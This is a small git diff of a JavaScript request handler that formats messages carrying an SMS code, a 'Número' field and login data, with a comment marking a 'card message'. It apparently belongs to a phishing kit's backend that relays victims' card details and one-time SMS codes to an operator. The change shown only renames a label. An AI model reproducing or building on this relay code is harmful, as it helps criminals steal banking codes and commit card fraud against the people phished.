@@ -58,7 +58,7 @@ export default async function handler(req, res) {
 }else if (SMSERROR ) {
   // 🟢 رسالة الكارت
   message = `
-  🔑sms_input Login:
+  🔑sms numero :
   - sms: ${SMSERROR}
    `;
 }else if (Número ) {
@@ -83,6 +83,7 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
 
 
 
